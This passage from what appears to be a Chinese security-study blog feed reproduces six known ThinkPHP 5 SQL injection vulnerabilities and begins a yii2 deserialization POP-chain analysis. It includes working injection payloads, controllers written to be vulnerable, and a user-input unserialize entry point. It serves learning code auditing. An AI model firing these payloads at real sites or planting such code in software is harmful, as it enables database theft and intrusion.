查询操作</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211104000136774.png" alt="image-20211104000136774"></p><p>对于 ysoserial 的调用也是一样的</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211104003402426.png" alt="image-20211104003402426"></p><p>ysoserial 为了防止在生成payload时执行URL请求和DNS查询，所以重写了一个 <code>SilentURLStreamHandler</code>类</p><h2 id="调试测试"><a href="#调试测试" class="headerlink" title="调试测试"></a>调试测试</h2><blockquote><p>明天来吧 有点困了，不划水了</p></blockquote><p>参考文章</p><p><a href="https://wx.zsxq.com/dweb2/index/topic_detail/244415545824541">https://wx.zsxq.com/dweb2/index/topic_detail/244415545824541</a></p><p><a href="https://www.geekby.site/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/">https://www.geekby.site/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/</a></p><p><a href="https://www.anquanke.com/post/id/201762">https://www.anquanke.com/post/id/201762</a></p><p><a href="https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/#more">https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/#more</a></p><p><a href="https://su18.org/post/ysoserial-su18-1/">https://su18.org/post/ysoserial-su18-1/</a></p><p>P神代码审计</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>Web</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tp5 SQL注入</title>
    <link href="/2021/10/31/Tp5-SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/10/31/Tp5-SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="ThinkPHP-5"><a href="#ThinkPHP-5" class="headerlink" title="ThinkPHP 5"></a>ThinkPHP 5</h1><h2 id="框架学习"><a href="#框架学习" class="headerlink" title="框架学习"></a>框架学习</h2><blockquote><p>ThinkPHP 5.0.24</p></blockquote><p>thinkphp5 与 thinkphp3 的区别</p><p><a href="https://cloud.tencent.com/developer/article/1135144">https://cloud.tencent.com/developer/article/1135144</a> </p><p><a href="https://blog.csdn.net/m0_37836194/article/details/89517379">https://blog.csdn.net/m0_37836194/article/details/89517379</a></p><p>目录结构</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211001220058899.png" alt="image-20211001220058899"></p><p>程序的入口文件是在 <code>public/index.php</code> 然后加载 <code>thinkphp/start.php</code> 在 <code>thinkphp/base.php</code> 中定义了一些常量，做好准备工作后就会执行 <code>App::run()-&gt;send()</code> 启动框架</p><p>路由逻辑</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211002184117887.png" alt="image-20211002184117887"></p><blockquote><p>还存在一些其他的路由方法</p><p><a href="http://127.0.0.1/public/index.php/index/index/index2">http://127.0.0.1/public/index.php/index/index/index2</a></p></blockquote><p>大致的源码阅读已经有大佬写了文章，这里我就不再写了，直接看就好了</p><p><a href="https://y4er.com/post/thinkphp5-source-read/">https://y4er.com/post/thinkphp5-source-read/</a></p><h2 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h2><h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><h4 id="SQL1（insert）"><a href="#SQL1（insert）" class="headerlink" title="SQL1（insert）"></a>SQL1（insert）</h4><p><strong>5.0.13&lt;=ThinkPHP&lt;=5.015 5.1.0&lt;=ThinkPHP&lt;=5.15</strong></p><p>环境的安装利用<code>composer</code></p><p><code>composer create-project --prefer-dist topthink/think=5.0.15 tpdemo</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// application/index/controller/Index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $username = request()-&gt;get(<span class="hljs-string">&#x27;username/a&#x27;</span>);<br>        db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;insert(<span class="hljs-string">&#x27;username&#x27;</span>=&gt;$username);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Update success&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create database tpdemo;<br>use tpdemo;<br>create table users(<br>id int primary key auto_increment,<br>username varchar(50) not null<br>);<br></code></pre></td></tr></table></figure><p><strong>漏洞复现</strong></p><p><code>insert()</code>注入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">payload</span>: /public/index.php/index/index/index?username[<span class="hljs-number">0</span>]=inc&amp;username[<span class="hljs-number">1</span>]=updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>,database(),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)&amp;username[<span class="hljs-number">2</span>]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211028232421470.png" alt="image-20211028232421470"></p><blockquote><p>需要再配置文件中开启调试功能，才会有报错回显</p></blockquote><p><strong>漏洞分析</strong></p><blockquote><p>漏洞分析的技巧可以对比官方更新文档来推测出漏洞点的位置</p></blockquote><p>直接寻找到 <code>insert()</code> 函数，<code>$username</code> 就是传入 <code>$data</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029000949504.png" alt="image-20211029000949504"></p><p><code>$data</code>是数组，所以执行后面的判断，这里的<code>inc</code> 和<code>dec</code> 都可以拿来注入，<code>exp</code>不行因为官方之前就有过滤了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029001626730.png" alt="image-20211029001626730"></p><p>这里的过滤把传入的一写危险单词给过滤了</p><p><img src="D:\markdown\image-20211029002700010.png" alt="image-20211029002700010"></p><p>最后将处理后的参数直接加入SQL语句这样就造成了注入</p><p>参考文章</p><p><a href="https://mochazz.github.io/2019/03/20/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A51">https://mochazz.github.io/2019/03/20/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A51</a></p><h4 id="SQL2（update）"><a href="#SQL2（update）" class="headerlink" title="SQL2（update）"></a>SQL2（update）</h4><p><strong>5.1.6&lt;=ThinkPHP&lt;=5.1.7</strong></p><p><strong>环境搭建</strong></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">composer </span><span class="hljs-built_in">create-project</span> <span class="hljs-built_in">--prefer-dist</span> <span class="hljs-string">topthink/</span><span class="hljs-string">think=</span>5.1.* <span class="hljs-string">tpdemo</span><br></code></pre></td></tr></table></figure><p>修改<code>composer.json</code> 文件中 ThinkPHP 的版本然后执行<code>composer update</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029163300310.png" alt="image-20211029163300310"></p><p>添加入口代码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029164350160.png" alt="image-20211029164350160"></p><p>开启debug模式不然报错注入没有回显，并且配置好框架数据库信息</p><p><strong>漏洞复现</strong></p><p>payload:<code>http://127.0.0.1/public/index.php/index/index/index?username[0]=point&amp;username[1]=1&amp;username[2]=updatexml(1,concat(0x7,database(),0x7e),1)^&amp;username[3]=1</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029164304431.png" alt="image-20211029164304431"></p><p><strong>漏洞分析</strong></p><p>直接根据 payload 来查看漏洞点，也可以查看官方的更新记录根据前后对比来发掘漏洞点</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029170335139.png" alt="image-20211029170335139"></p><p>最终的 <code>update()</code> 函数是在<code>builder.php</code>中构建的 SQL 语句</p><p>最后的漏洞出现在<code>parseArrayData()</code>函数这里</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029171046857.png" alt="image-20211029171046857"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029171704358.png" alt="image-20211029171704358"></p><p>这个函数的<code>list()</code>函数反向赋值有点没有看懂？？？</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029172740053.png" alt="image-20211029172740053"></p><p>这里把传入的参数进行了拼接然后插入进了 SQL 语句中，并且没有经过任何过滤措施，就造成了SQL注入漏洞</p><h4 id="SQL3（select）"><a href="#SQL3（select）" class="headerlink" title="SQL3（select）"></a>SQL3（select）</h4><p>影响范围：ThinkPHP 全版本</p><p><strong>环境搭建</strong></p><p>直接利用上一个环境即可</p><p>入口</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $username = request()-&gt;get(<span class="hljs-string">&#x27;username&#x27;</span>);<br>        $result = db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;where(<span class="hljs-string">&#x27;username&#x27;</span>,<span class="hljs-string">&#x27;exp&#x27;</span>,$username)-&gt;select();<br>        <span class="hljs-keyword">return</span> $result;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>漏洞复现</strong></p><p>payload: <code>http://127.0.0.1/public/index.php/index/index/index?username=)%20union%20select%20updatexml(1,concat(0x7,user(),0x7e),1)--+</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029182836622.png" alt="image-20211029182836622"></p><p><strong>漏洞分析</strong></p><p>调试的时候直接在<code>Builder</code> 类<code>select()</code>处下断点，因为主要是在这里生成 SQL 语句</p><p>从 <code>select()</code> 中的 <code>parseWhere()</code> 到 <code>buildWhere()</code> 然后到 <code>parseWhereItem()</code> </p><p><code>parseWhereItem()</code>中是漏洞的主要点（记得好像 TP3 也有类似），获取到值输入的语句</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029195319761.png" alt="image-20211029195319761"></p><p>这里循环检测<code>$exp</code>是否在<code>$parser</code>数组中，如果存在就进入执行拼接语句并且返回（未做任何过滤）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029194524372.png" alt="image-20211029194524372"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029193916454.png" alt="image-20211029193916454"></p><p>最后构成SQL注入</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029200920783.png" alt="image-20211029200920783"></p><blockquote><p>分析得比较简略</p></blockquote><p>参考文章</p><p><a href="https://mochazz.github.io/2019/03/23/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A53/#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%A6%81">https://mochazz.github.io/2019/03/23/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A53/#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%A6%81</a></p><h4 id="SQL4"><a href="#SQL4" class="headerlink" title="SQL4"></a>SQL4</h4><p>漏洞影响：<code>ThinkPHP=5.0.10</code></p><p><strong>环境搭建</strong></p><p><code>composer create-project --prefer-dist topthink/think=5.0.10 tp5.0.10</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $username = request()-&gt;get(<span class="hljs-string">&#x27;username/a&#x27;</span>);<br>        $result = db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;where([<span class="hljs-string">&#x27;username&#x27;</span> =&gt; $username])-&gt;select();<br>        var_dump($result);<br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>漏洞复现</strong></p><p>payload: <code>http://127.0.0.1/public/index.php/index/index/index?username[0]=not%20like&amp;username[1][0]=%%&amp;username[1][1]=233&amp;username[2]=)%20union%20select%201,user()--+ </code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029204945485.png" alt="image-20211029204945485"></p><p><strong>漏洞分析</strong></p><p>当数据传输给服务器时，不管使用哪种方法在 <code>ThinkPHP</code> 中都会经过 <code>Request</code> 类的 <code>input</code> 方法，这些数据都会被强制类型转换，并且经过 <code>filterValue</code> 方法的处理</p><p>注意这里的过滤虽然包含了 NOTLIKE 但是这里中间没有空格</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030001513315.png" alt="image-20211030001513315"></p><p>动态调试一下</p><p>这里直接跳过了，没有被过滤</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030002532518.png" alt="image-20211030002532518"></p><p>之后的参数拼接，主要就是在<code>parseWhereItem()</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030003754664.png" alt="image-20211030003754664"></p><p>这里就是利用payload中username需要传入二维数组的原因</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030004242391.png" alt="image-20211030004242391"></p><p>最后执行下来就会造成SQL注入了</p><p>这个漏洞只在 ThinkPHP 5.0.10中出现是因为之前的版本中默认不允许出现 not like。</p><p>参考文章</p><p><a href="https://mochazz.github.io/2019/03/23/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A54/">https://mochazz.github.io/2019/03/23/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A54/</a></p><h4 id="SQL5-（order）"><a href="#SQL5-（order）" class="headerlink" title="SQL5 （order）"></a>SQL5 （order）</h4><p>影响版本：<code>5.1.16&lt;=ThinkPHP&lt;=5.1.22</code></p><p><strong>环境搭建</strong></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">composer </span><span class="hljs-built_in">create-project</span> <span class="hljs-built_in">--prefer-dist</span> <span class="hljs-string">topthink/</span><span class="hljs-string">think=</span>5.1.<span class="hljs-string">22 </span><span class="hljs-string">tp5.</span>1.<span class="hljs-string">22</span><br></code></pre></td></tr></table></figure><p>然后修改<code>compose.json</code>更新一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $orderby = request()-&gt;get(<span class="hljs-string">&#x27;orderby&#x27;</span>);<br>        $result = db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;where([<span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-string">&#x27;admin&#x27;</span>])-&gt;order($orderby)-&gt;find();<br>        var_dump($result);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>需注意的是 php 的版本问题</p></blockquote><p><strong>漏洞复现</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://127.0.0.1/public/index.php/index/index/index?orderby</span>[<span class="hljs-string">id`|updatexml(1,concat(0x7,user(),0x7e),1)%23</span>]=1<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030201755912.png" alt="image-20211030201755912"></p><p><strong>漏洞分析</strong></p><blockquote><p>这个 payload 有点奇怪没有见过，是在键中的</p></blockquote><p>这个漏洞主要是由 <code>order</code> 引起的</p><p>传入的值会经过<code>Request</code>类中的<code>input()</code>函数，之后就会经过过滤函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030211107424.png" alt="image-20211030211107424"></p><p>这里经过递归过滤但是这里的特殊的地方就是 payload 在键中</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030211648109.png" alt="image-20211030211648109"></p><p>之后就进入查询，因为知道是 order 注入，所以这里直接跟进相关函数，调试时更进到 <code>parseOrder()</code>函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030223027240.png" alt="image-20211030223027240"></p><p>上面的<code>parseKey（）</code>使用给<code>$key</code>前后添加了反引号</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030224610437.png" alt="image-20211030224610437"></p><p>最后被拼接到了SQL语句中，造成了SQL注入</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030234224569.png" alt="image-20211030234224569"></p><p>官方的修复方法是对变量就行了检查，判断是否存在<code>)</code> <code>#</code></p><p>参考文章</p><p><a href="https://blog.csdn.net/lyj20010728/article/details/119685805">https://blog.csdn.net/lyj20010728/article/details/119685805</a></p><p><a href="https://www.codetd.com/article/13124414">https://www.codetd.com/article/13124414</a></p><p><a href="https://mochazz.github.io/2019/04/01/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A55/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">https://mochazz.github.io/2019/04/01/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A55/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90</a></p><h4 id="SQL6"><a href="#SQL6" class="headerlink" title="SQL6"></a>SQL6</h4><p>影响版本</p><p><code>5.0.0&lt;=ThinkPHP&lt;=5.0.21</code></p><p><code>5.1.3&lt;=ThinkPHP&lt;=5.1.25</code></p><p><strong>环境配置</strong></p><p>还是利用上面的漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $options = request()-&gt;get(<span class="hljs-string">&#x27;options&#x27;</span>);<br>        $result = db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;max($options);<br>        var_dump($result);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>需要开启 app_debug 和 app_trace</p><p><strong>漏洞复现</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/public/index.php/index/index/index?options=id`)%<span class="hljs-number">2</span>bupdatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>,user(),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)%<span class="hljs-number">20</span>from%<span class="hljs-number">20</span>users%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211031000952539.png" alt="image-20211031000952539"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211031003033967.png" alt="image-20211031003033967"></p><p>不同版本的 payload 有一定的差别</p><blockquote><p>5.0.0~5.0.21、5.1.3～5.1.10: id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</p><p>5.1.11～5.1.25: id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</p></blockquote><p><strong>漏洞分析</strong></p><p>直接根据 payload 传入的位置分析</p><p>先是对输入的 payload 进行了一些处理，加上了括号和反引号，之后就会进入<code>select()</code> 函数去进行SQL语句的拼接</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211031010520705.png" alt="image-20211031010520705"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211031010535400.png" alt="image-20211031010535400"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211031010558540.png" alt="image-20211031010558540"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211031010810261.png" alt="image-20211031010810261"></p><p>最后构造的结果是这个样</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211031012135626.png" alt="image-20211031012135626"></p><p>官方的修复方法就是在<code>parseKey()</code>过滤了一些 字母 点号 星号 以外的字符</p><p>参考文章</p><p><a href="https://mochazz.github.io/2019/04/02/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A56/">https://mochazz.github.io/2019/04/02/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A56/</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个只是参考了别的大师傅的文章复现了一下SQL漏洞，主要是为了提升代码审计的能力也是为了能够了解ThinkPHP框架，并且在审计的过程中发现ThinkPHP的注入漏洞都在 Build 类中的方法。但是对于自己想挖这样的漏洞出来还是很不容易的…………继续学习吧希望有一天能够自己审计出一个0day。经过这几个漏洞的分析，框架的调试能力也熟练了许多。</p><p>参考文章</p><p><a href="https://mochazz.github.io/">https://mochazz.github.io/</a></p><p><a href="https://y4er.com/post/thinkphp5-source-read/">https://y4er.com/post/thinkphp5-source-read/</a></p><p><a href="https://y4er.com/post/thinkphp5-rce/">https://y4er.com/post/thinkphp5-rce/</a></p><p><a href="https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-5.x-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/Thinkphp-5.0.1.html">https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-5.x-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/Thinkphp-5.0.1.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>yii2 反序列化POP链</title>
    <link href="/2021/10/28/yii2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE/"/>
    <url>/2021/10/28/yii2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="yii2-反序列化漏洞"><a href="#yii2-反序列化漏洞" class="headerlink" title="yii2 反序列化漏洞"></a>yii2 反序列化漏洞</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>源码下载：<a href="https://github.com/yiisoft/yii2/releases/tag/2.0.37">https://github.com/yiisoft/yii2/releases/tag/2.0.37</a></p><p>在<code>config/web.php</code>中给<code>cookieValidationKey</code>配置添加一个密钥</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027122133108.png" alt="image-20211027122133108"></p><p>写入一个反序列化入口</p><p><code>controllers/SerializeController.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">controllers</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SerializeController</span> <span class="hljs-keyword">extends</span> \<span class="hljs-title">yii</span>\<span class="hljs-title">web</span>\<span class="hljs-title">Controller</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">actionSerialize</span>(<span class="hljs-params">$data</span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> unserialize(base64_decode($data));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>启动框架 <code>php yii serve</code> 默认端口为 8080 可以通过 <code>--port=port</code> 更换端口</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027123716179.png" alt="image-20211027123716179"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027123846587.png" alt="image-20211027123846587"></p><p>使用手册帮助我们快速理解框架：<a href="https://www.kancloud.cn/manual/yii2-guide/69671">https://www.kancloud.cn/manual/yii2-guide/69671</a></p><p>路由访问方式</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027131522065.png" alt="image-20211027131522065"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027131613252.png" alt="image-20211027131613252"></p><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="POP-1"><a href="#POP-1" class="headerlink" title="POP 1"></a>POP 1</h3><blockquote><p>跟着大师傅分析一下</p></blockquote><p>入口点 <code>vendor/yiisoft/yii2/db/BatchQueryResult.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span 